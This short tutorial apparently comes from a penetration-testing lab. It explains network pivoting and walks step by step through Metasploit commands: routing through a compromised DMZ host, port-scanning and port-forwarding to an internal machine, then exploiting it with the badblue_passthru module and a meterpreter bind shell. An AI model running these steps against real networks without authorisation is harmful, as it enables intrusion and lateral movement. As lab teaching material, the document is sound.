# Pivoting
Let's perform pivoting!
# Introduction of the Pivoting technique
Pivoting is a technique in cyber security that allows an attacker to move from one compromised system to another within a network. It simulates how a real attacker would try to access more valuable or vulnerable targets by using a foothold machine as a bridge. There are different types of pivoting, such as port forwarding, VPN pivoting, and SOCKS proxy pivoting. Pivoting is also related to lateral movement, which involves privilege escalation on the same or different machines.<br>
<img src="pivoting.png" width=70% height="auto"><br><br>
## Example of Pivoting <br>
### **We are in the DMZ. After obtaining the initial access to a target, we will use it to perform pivoting on the internal network..<br>**
**Victim Machine 1 : 10.3.25.174** (first Target in the DMZ)<br>
**Victim Machine 2 : 10.3.24.33** (second Target in the internal network target reachable with Pivoting) <br>

### **Exploit the first Machine and got an initial access.<br>**
<img src="exploit1.png" width=70% height="auto"><br>
 - **ipconfig<br>**
<img src="ipconfig.png" width=70% height="auto"><br>
 - **Execute the command: run autoroute -s 10.3.25.0/20<br>**
<img src="autoroute.png" width=70% height="auto"><br>
### Use Metasploit post exploitation module for scanning the Target 2: <br>
 - **use auxiliary/scanner/portscan/tcp<br>**
 - **set RHOSTS 10.3.24.33  (ip target 2)<br>**
 - **set PORTS 1-100<br>**
 - **exploit <br>**
<img src="scanningtarget2.png" width=65% height="auto"><br>
Now, we will forward the remote port 80 to local port 1234 and grab the banner using Nmap<br>
 - **portfwd add -l 1234 -p 80 -r 10.3.24.33 (ip target 2)<br>**
<img src="fwd.png" width=55% height="auto"><br>
 - **nmap -sV -sS -p 1234 localhost (don't close Meta, use another terminal)<br>**
<img src="fwdnmap.png" width=70% height="auto"><br>
### Successfull! We scanned the internal network Target!! Now we will exploit it with Metasploit.<br>
 - **use exploit/windows/http/badblue_passthru<br>**
 - **set PAYLOAD windows/meterpreter/bind_tcp<br>**
 - **set RHOSTS 10.3.24.33 (ip target 2)<br>**
 - **set LPORT 3333<br>**
 - **exploit<br>**
<img src="exploit2.png" width=70% height="auto"><br>
### Check that we are in the Target 2
 - **sysinfo and ipconfig<br>**
<img src="check1.png" width=70% height="auto"><img src="check2.png" width=70% height="auto"><br><br>

#Author
<b>Xiao Li Savio Feng</b>
